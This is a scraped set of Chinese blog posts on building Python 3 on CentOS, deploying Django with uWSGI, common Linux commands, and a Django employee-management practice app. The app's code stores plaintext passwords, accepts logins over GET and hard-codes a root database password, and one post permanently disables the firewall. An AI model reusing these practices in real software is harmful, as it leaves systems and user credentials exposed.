(建议位置：&#x2F;usr&#x2F;local&#x2F;) 解压tar包:tar -zxvf Python-3.5.2.tgz cd到解压目录中配置：./configure --prefix=/usr/local/python3 --enable-optimizations 目的：检测环境中依赖是否完整，设置python的安装位置，同时生成一个编译文件，用于进行python编译：make 在解压目录中：先 make 编译 然后 make install 安装 123456安装后的日志如下....Collecting setuptoolsCollecting pipInstalling collected packages: setuptools, pipSuccessfully installed pip-8.1.1 setuptools-20.10.1 将python3 设置为系统默认python解释器 将&#x2F;usr&#x2F;bin下的python文件改名 mv /usr/bin/python /usr/bin/python2.7.5 将python3的执行文件链接到 &#x2F;usr&#x2F;bin&#x2F;python ln -s /usr/local/python3/bin/python3 /usr/bin/python 12# 执行以上两步操作并不是把python3安装目录添加到环境变量中# 而是将python3安装目录下python3解释器软链接到某一个环境变量的目录下 设置环境变量：&#x2F;etc&#x2F;profile中添加配置 123在文件末尾追加，不要改动文件的其他内容！！！！！！！export python_home=/usr/local/python3export PATH=$PATH:$python_home/bin 注意，设置好后，为了让环境变量生效：source /etc/profile，然后 python3即可进入python3的环境 更新pip pip3 install --upgrade pip 补充： 安装yum install mysql-devel 由于yum用python2编译执行，所以需要单独为yum设置为python2，找到/usr/bin/yum文件，修改文件头：#!/usr/bin/python2.7.5 修改 &#x2F;usr&#x2F;libexec&#x2F;urlgrabber-ext-down 文件的第一行改为 ‘#!/usr/bin/python2.7.5’ 12345678910111213141516171819202122232425# 总结Python安装步骤： 1. 安装依赖 两长串复制过去直接执行 -- 注意需要外网 2. 将python3.6+的tar包发送到linux系统中 建议放在/usr/local下 3. 解压tar包 4. 进入解压目录，执行 ./configure --prefix=/usr/local/python3 --enable-optimizations 5. 执行 make 指令 -- 注意时间较长 6. make install 即可完成安装 -- 安装完后在/usr/local/python3下就是python的安装文件 # 发软链接 1. 将默认的Python2版改名 mv /usr/bin/python /usr/bin/python2.7.5 2. 再将python3下的解释发快捷方式到/usr/bin下 ln -s /usr/local/python3/bin/python3 /usr/bin/python # 配置环境变量 1. vi /etc/profile文件下 在最后面添加下面的内容： export PATH=$PATH:/usr/local/python3/bin/ 2. 让环境变量生效 执行 source /etc/profile即可 # 更新pip 1. 执行 pip3 install --upgrade pip # 修改yum文件头 yum默认是基于python2 1. vi /usr/bin/yum 的第一行的最后面改为python2.7.5 2. vi /usr/libexec/urlgrabber-ext-down 同上即可 三、Django安装 安装数据库驱动：pip install mysqlclient pip install django==&quot;2.0.6&quot; 测试使用： django-admin startproject testproj 在当前目录下创建一个project:”testproj” cd到testproj目录下的testporj目录下settings.py 修改配置：ALLOWED_HOSTS = [&quot;*&quot;] 启动django内置的web服务器。cd到testproj目录下，执行：python manage.py runserver 0.0.0.0:port 在Windows的浏览器中访问：ip:port – ip为Linux系统的ip地址 四、uWSGI服务器1、WSGI协议 使用Django或Flask框架编写的Web应用程序，在python manage.py runserver 时都启动的是框架内置的服务器来运行Web应用程序，而内置的服务器遵循了WSGI协议（WSGI Server）。 WSGI：全称是Web Server Gateway Interface，WSGI不是服务器，python模块，框架，API或者任何软件，只是一种规范，描述web server如何与web application通信的规范。 WSGI server负责从客户端接收请求，将request转发给application，将application返回的response返回给客户端； WSGI application接收由server转发的request，处理请求，并将处理结果返回给server。 要实现WSGI协议，必须同时实现web server和web application，当前运行在WSGI协议之上的web框架有Bottle, Flask, Django。 总结：WSGI是Web 服务器(uWSGI)与 Web 应用程序或应用框架(Django)之间的一种低级别的接口。 2、uWSGI服务器安装WSGI协议下web服务器很多：django内置，uWSGI，gunicorn。 2.1 服务器安装 将uWSGI的tar包发送linux 解压tar：tar -zxvf uwsgi-2.0.17.tar.gz cd到解压目录下，编译：make 为了可以更方便的执行 uwsgi 启动uWSGI服务器，定制链接： ln -s /usr/local/uwsgi-2.0.17/uwsgi /usr/bin/uwsgi 则可以在任意目录下执行 uwsgi 去启动uWSGI服务器 测试使用python的wsgi服务器-uWSGI 在任意的一个目录中定义一个python脚本：hello.py 123def application(env, start_response): start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)]) return [bytes(&#x27;你好啊！！&#x27;,&#x27;utf-8&#x27;),b&#x27;Mr_lee&#x27;] # 基于wsgi协议规范实现的代码 启动uWSGI服务器，并部署hello.py程序 uwsgi --http 192.168.248.128:8001 --wsgi-file hello.py #注意hilo.py可以写成绝对路径 浏览器访问：192.168.248.128:8001 3、 uWSGI部署django项目 在数据库中建好项目需要的database：“ems” 使用Navicat创建即可,注意字符集为 utf8 在Django项目的settings.py中修改配置 12345678910111213DEBUG = False #去掉开发模式 ALLOWED_HOSTS = [&quot;*&quot;] #开放访问hostDATABASES = &#123; #合适数据库参数 &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;ems&#x27;, &#x27;USER&#x27;: &#x27;root&#x27;, &#x27;HOST&#x27;: &#x27;localhost&#x27;, &#x27;PORT&#x27;: &#x27;3306&#x27;, &#x27;PASSWORD&#x27;: &#x27;123456&#x27; &#125;&#125; 发送项目到linux并做移植 python manage.py makemigrations python manage.py migrate 编写uWSGI的配置文件 12345678910111213141516171819202122232425#随意找一个目录，创建一个文件：config.ini -- 建议放在项目的根目录下[uwsgi]http = 192.168.134.128:9000 # uWSGI服务器访问地址#uWSGI和nginx通信的portsocket = 192.168.134.128:9001# the base directory (full path)chdir = /usr/local/django_projects/ems #项目所在目录# Django&#x27;s wsgi filewsgi-file = ems/wsgi.py #基于项目目录的相对路径# maximum number of worker processesprocesses = 4#thread numbers startched in each worker processthreads = 2#monitor uwsgi status 通过该端口可以监控 uwsgi 的负载情况stats = 192.168.134.128:9002# clear environment on exitvacuum = truepidfile = /usr/local/django_projects/ems/uwsgi.pid #进程ID存放于此文件，位置可以自定义#daemonize-run ,file-to-record-logdaemonize = /usr/local/django_projects/ems/uwsgi.log #后台启动模式，日志文件记录位置自定义#http://ip:port/static/...请求会进入该目录找资源，此处可以指向某个app下的static目录#或是将所有静态文件汇总到项目的某一个目录下，然后配置在此是更好的选择#汇集所有已安装app的静态资源到一个目录下，请参见后续内容#http://ip:port/static/a/b/c/d.png ==&gt; /usr/local/xxxx/static/a/b/c/d.pngstatic-map =/static=/usr/local/xxx/static # 只在你写的static-map中找静态资源 根据如上配置启动uWSGI服务器 uwsgi --ini config.ini #注意：config.ini是一个相对路径 关闭服务器 uwsgi --stop uwsgi.pid #通过进程id文件 使用uwsgi服务器运行项目后，出现静态资源无法加载的问题 123456# 分析原因： 1.在django内置的服务器中，调试模式，django查找静态资源默认在每个app的static目录 2. 或者可以在setting.py文件中 STATICFILES_DIRS = [os.path.join(BASE_DIR,&#x27;static&#x27;)] 将项目根目录下的static目录作为静态资源的查找路径 # 但是uwsgi服务器有自己的静态资源的处理方式，也就是它不会在上述的两个地方查找静态资源 uwsgi如何处理静态资源 1234567891011121314# 在config.ini配置文件的最后面来告诉uwsgi服务器要在哪里去找静态资源[uwsig]http = xxx:9000socket = xxx:9001.........# 写你的静态资源的绝对路径，如果在项目根目录下，直接写项目根目录/static即可# 如果是每个app自己管理，把所有的app的static目录添加进来，有几个app加几个static-mapstatic-map=/static=/usr/local/xxx/static url可以分为两大类：1. 普通url-动态资源url 会在urls.py文件中匹配访问路径 最终找到视图函数2. 静态资源url-- /static/ 告诉django当url中有/static/时django会在静态资源的目录下去查找资源 如果你的app过多，每个app自己管理静态资源，此时需要添加的static-map太多 123456# 只需要做两步操作就可以把所有app下的静态资源static目录的文件收集到某一个目录下1. 在项目的setting.py文件中添加 STATIC_ROOT=os.path.join(BASE_DIR,&#x27;static&#x27;) 用于告诉django，将来收集到的静态资源往哪里放 2. 执行收集的指令 python manage.py collectstatic STATIC_URL &#x3D; ‘&#x2F;static&#x2F;‘ # 每个静态资源URL的访问前缀 STATICFIELS_DIRS &#x3D; [os.path.join(BASE_DIR,’static’)] # 添加django内置服务器查找静态资源的路径 STATIC_ROOT &#x3D; os.path.join(BASE_DIR,’static’) # 收集静态资源时的路径 static-map&#x3D;&#x2F;static&#x3D;xxxx # 告诉uwsgi服务器到哪里去找静态资源","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Linux-常用指令","slug":"Linux-常用指令","date":"2020-09-03T09:24:44.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/03/Linux-常用指令/","permalink":"http://example.com/2020/09/03/Linux-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","excerpt":"1.基础命令2.vi编辑模式3.网络4.压缩文件","text":"1.基础命令2.vi编辑模式3.网络4.压缩文件 Linux常用指令1.基础命令12345678910111213141516171819202122232425262728ls:显示当前目录清单cd: 切换目录​ cd ~ 或者 cd 切换到用户主目录​ cd / 切换到根目录​ cd .. 上一级目录pwd: 显示当前工作目录man: 查看帮助mkdir 创建目录rmdir 删除目录touch 创建文件rm -rf 强制删除mv 移动文件或目录*匹配任意字符?匹配一个字符cat 显示文件内容ps -ef | grep 进程名 显示所有的进程kill -9 进程名 强制杀死 2.vi编辑模式1234- :w 保存文本- :q 不保存文本并退出vi- :q! 不保存文本并强制退出vi （常用）- :wq 保存文本并退出vi （常用） 12345678910#### 进入文本编辑器，输入【i/I、o/O、a/A、r/R】进入编辑模式：- i：在光标处插入(常用)- I：在光标所在行第一个非空格字符处插入 -- 行首 (常用)- o：在光标所在行的下一行插入新的一行(常用) -- Other- O：在光标所在行的上一行插入新的一行- a：在光标所在位置的下一个字符处开始插入- A：在光标所在行的最后一个位置开始插入 -- 行尾 (常用)- r：替换光标所在位置的字符(只替换一次) - R：一直替换光标所在位置的字符，直到按(esc)键为止 1234567891011##### 删除、复制、粘贴、撤消- ​ dd：删除(剪切)光标所在行- ​ ndd: 删除(剪切)光标所在的向下n行 5dd- ​ yy: 复制当前行- ​ nyy: 复制光标所在的向下n行 6yy- ​ p: 将已复制的数据在光标下一行粘贴 - ​ P: 将已复制的数据在光标上一行粘贴- ​ u: 撤消删除 - ​ shift + g 文件尾- ​ shift + G 文件头 3.网络1.查看ipip addr 2.设置虚拟机ip123451. vi /etc/sysconfig/network-scripts/ifcfg-eno167xxxx #### 将其中的 ONBOOT=yes2.重启网络服务 systemctl restart network 3.设置防火墙123456789- 查看防火墙状态 systemctl status firewalld.service- 关闭防火墙 systemctl stop firewalld.service`- 启动防火墙 systemctl start firewalld.service - 永久关防火墙 systemctl disable firewalld.service 4.压缩文件tar命令参数 c 压缩文件 x 解压文件 z 格式为gzip v 显示执行文件列表 f 要操作的文件 直接解压 tar –zxvf xxx.tar &#x2F; xxx.tar.gz解压后，编译安装","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Django-ems重构","slug":"Django-ems重构","date":"2020-09-03T08:36:15.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/03/Django-ems重构/","permalink":"http://example.com/2020/09/03/Django-ems%E9%87%8D%E6%9E%84/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 模糊查询, 登陆,注册使用 Jquery-Ajax","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 模糊查询, 登陆,注册使用 Jquery-Ajax Django—-ems项目重构views视图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import os, random, string, uuidfrom django.core.paginator import Paginatorfrom django.db import transactionfrom django.http import HttpResponse, JsonResponsefrom django.shortcuts import render, redirectfrom captcha.image import ImageCaptchafrom emsapp.models import User, Staff# 登陆页面def login1(request): return render(request, &#x27;emsapp/login.html&#x27;)# 登陆def login(request): if request.method == &quot;GET&quot;: username = request.GET.get(&quot;name&quot;) userpwd = request.GET.get(&quot;pwd&quot;) else: username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) print(userpwd, username) res = User.objects.filter(user_name=username, user_pwd=userpwd) if res: # 设置session request.session[&#x27;login&#x27;] = True # 使用ajax局部更新 return HttpResponse(&#x27;ok&#x27;) return HttpResponse(&#x27;用户名或密码错误&#x27;)# 注册def regist(request): return render(request, &#x27;emsapp/regist.html&#x27;)# 验证码生成def getCaptcha(request): img = ImageCaptcha() code = random.sample(string.ascii_uppercase + string.ascii_lowercase + string.digits, 4) # 拼接字符,通过session传递验证码 random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code data = img.generate(random_code) return HttpResponse(data, &#x27;image/png&#x27;)# 注册逻辑def regist_logic(request): username = request.POST.get(&#x27;username&#x27;) password = request.POST.get(&#x27;pwd&#x27;) name = request.POST.get(&#x27;name&#x27;) sex = request.POST.get(&#x27;sex&#x27;) code = request.session[&#x27;code&#x27;] captcha = request.POST.get(&#x27;captcha&#x27;) print(captcha, name, username) try: with transaction.atomic(): if captcha.lower() == code.lower(): res = User.objects.filter(user_name=username) if res: return HttpResponse(&#x27;user_have&#x27;) else: User.objects.create(user_name=username, user_pwd=password, name=name, sex=sex) return HttpResponse(&#x27;ok&#x27;) else: return HttpResponse(&#x27;error&#x27;) except: print()# 主页逻辑def emplist_logic(request): staff = Staff.objects.all() # 实现分页 page_number = request.session.get(&#x27;page_number&#x27;) # 添加 page_number1 = request.session.get(&#x27;page_number1&#x27;) # 修改更新 num = request.GET.get(&quot;num&quot;, 1) paginator = Paginator(staff, per_page=3) if page_number: num = paginator.num_pages request.session[&#x27;page_number&#x27;] = False if page_number1: num = page_number1 request.session[&#x27;page_number1&#x27;] = False if int(num) &gt; paginator.num_pages: num = paginator.num_pages elif int(num) &lt; 1: num = 1 page = paginator.page(num) return render(request, &#x27;emsapp/emplist.html&#x27;, &#123;&quot;page&quot;: page&#125;)# 添加员工def addEmp(request): request.session[&#x27;page_number&#x27;] = True return render(request, &#x27;emsapp/addEmp.html&#x27;)# 添加员工逻辑def addEmp_logic(request): try: name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) head_pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(head_pic.name)[1] pic = str(uuid.uuid4()) + ext head_pic.name = pic with transaction.atomic(): Staff.objects.create(name=name, salary=salary, age=age, head_pic=head_pic) return redirect(&#x27;emsapp:emplist_logic&#x27;) except: print()# 删除员工def delete(request): try: number = request.GET.get(&#x27;num&#x27;) request.session[&#x27;page_number1&#x27;] = number with transaction.atomic(): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) staff.delete() return redirect(&#x27;emsapp:emplist_logic&#x27;) except: print()# 更新员工def updateEmp(request): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) number = request.GET.get(&#x27;num&#x27;) request.session[&#x27;page_number1&#x27;] = number return render(request, &#x27;emsapp/updateEmp.html&#x27;, &#123;&quot;staff&quot;: staff&#125;)# 更新员工逻辑def updareEmp_logic(request): try: id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) head_pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(head_pic.name)[1] pic = str(uuid.uuid4()) + ext head_pic.name = pic with transaction.atomic(): staff.name = name staff.salary = salary staff.age = age staff.head_pic = head_pic staff.save() return redirect(&#x27;emsapp:emplist_logic&#x27;) except: print()# 模糊查询def query(request): staff = request.GET.get(&quot;s1&quot;) res = Staff.objects.filter(name__icontains=staff) def mydefault(u): if isinstance(u, Staff): return &#123;&#x27;name&#x27;: u.name, &#x27;salary&#x27;: u.salary, &#x27;age&#x27;: u.age&#125; return JsonResponse(&#123;&#x27;staff&#x27;: list(res)&#125;, safe=False, json_dumps_params=&#123;&#x27;default&#x27;: mydefault&#125;) emplist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&#123;% static &#x27;emsapp/css/style.css&#x27; %&#125;&quot;/&gt; &lt;script src=&quot;&#123;% static &#x27;emsapp/js/jquery-1.11.1.min.js&#x27; %&#125;&quot;&gt;&lt;/script&gt; &#123;% block script %&#125; &lt;script&gt; $(document).ready(function () &#123; $(&quot;#query&quot;).click(function () &#123; $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#123;% url &#x27;emsapp:query&#x27; %&#125;&quot;, data: &quot;s1=&quot; + $(&quot;#s1&quot;).val(), success: function (c) &#123; console.log(c); c = c[&#x27;staff&#x27;]; var str = &#x27;&lt;tr&gt;&lt;td&gt;姓名&lt;/td&gt;&lt;td&gt;薪水&lt;/td&gt;&lt;td&gt;年龄&lt;/td&gt;&lt;/tr&gt;&#x27;; for (var i = 0; i &lt; c.length; i++) &#123; str += &quot;&lt;tr&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;name&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;salary&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;age&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;/tr&gt;&quot;; &#125; $(&quot;#t1&quot;)[0].innerHTML = str &#125; &#125;) &#125;) &#125;) &lt;/script&gt; &#123;% endblock %&#125;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;div&gt; &lt;input type=&quot;text&quot; id=&quot;s1&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;搜索&quot; id=&quot;query&quot;&gt; &lt;/div&gt; &lt;table class=&quot;table&quot; id=&quot;t1&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; head_pic &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in page.object_list %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.head_pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;emsapp:delete&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp; &lt;a href=&quot;&#123;% url &quot;emsapp:updateEmp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.head_pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;emsapp:delete&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;emsapp:updateEmp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125; &#123;% for foo in page.paginator.page_range %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&quot;&gt; &#123;% if foo == page.number %&#125; &lt;span class=&quot;a&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;span class=&quot;b&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;/a&gt; &#123;% endfor %&#125; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125; &#123;% if not page.paginator.num_pages == page.number %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&quot;&gt;尾页&lt;/a&gt; &#123;% endif %&#125; &lt;form action=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;&quot; method=&quot;get&quot;&gt; 输入页号&lt;input type=&quot;text&quot; name=&quot;num&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;跳转&quot;&gt; &lt;/form&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location.href=&#x27;&#123;% url &quot;emsapp:addEmp&quot; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/div&gt; &#123;% endblock %&#125; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; login.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% block script %&#125; &lt;script&gt; $(document).ready(function () &#123; $(&quot;#sumbit&quot;).click(function () &#123; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;emsapp:login&#x27; %&#125;&quot;, data: &quot;name=&quot; + $(&quot;#name&quot;).val() + &quot;&amp;pwd=&quot; + $(&quot;#pwd&quot;).val() + &#x27;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&#x27;, success: function (msg) &#123; &#123;#console.log(msg);#&#125; if (msg == &#x27;ok&#x27;) &#123; location.href = &quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;&quot; &#125; else &#123; $(&quot;#s1&quot;)[0].textContent = msg; console.log($(&quot;#s1&quot;)); &#125; &#125; &#125;) &#125;) &#125;) &lt;/script&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; login &lt;/h1&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; username: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; id=&quot;name&quot;/&gt; &lt;span id=&quot;s1&quot;&gt;&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; password: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; id=&quot;pwd&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; id=&quot;sumbit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot;/&gt; &lt;input type=&quot;button&quot; value=&quot;注册 &amp;raquo;&quot; class=&quot;button&quot; onclick=&quot;location.href=&#x27;&#123;% url &#x27;emsapp:regist&#x27; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; regist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% block script %&#125; &lt;script&gt; $(document).ready(function () &#123; $(function () &#123; $(&quot;#a1&quot;).click(function () &#123; $(&quot;#img1&quot;)[0].src = &quot;&#123;% url &#x27;emsapp:getCaptcha&#x27; %&#125;?&quot; + new Date().getTime(); &#125;) &#125;); $(&quot;#submit&quot;).click(function () &#123; console.log(&#x27;sdfsdf&#x27;); $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;emsapp:regist_logic&#x27; %&#125;&quot;, data: &quot;username=&quot; + $(&quot;#username&quot;).val() + &quot;&amp;name=&quot; + $(&quot;#name&quot;).val() + &quot;&amp;pwd=&quot; + $(&quot;#pwd&quot;).val() + &quot;&amp;sex=&quot; + $(&quot;[name=sex]&quot;).val() + &quot;&amp;captcha=&quot; + $(&quot;#captcha&quot;).val() + &quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; console.log(msg); if (msg == &#x27;ok&#x27;) &#123; location.href = &quot;&#123;% url &#x27;emsapp:login1&#x27; %&#125;&quot; &#125; else if (msg ==&#x27;user_have&#x27;) &#123; $(&quot;#s1&quot;)[0].textContent = &quot;用户名已存在&quot; &#125;else &#123; $(&quot;#s1&quot;)[0].textContent = &quot;验证码错误&quot; &#125; &#125; &#125;) &#125;) &#125;) &lt;/script&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; 注册 &lt;/h1&gt; &lt;form&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 用户名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; id=&quot;username&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 真实姓名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; id=&quot;name&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 密码: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; id=&quot;pwd&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 性别: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; 男 &lt;input type=&quot;radio&quot; 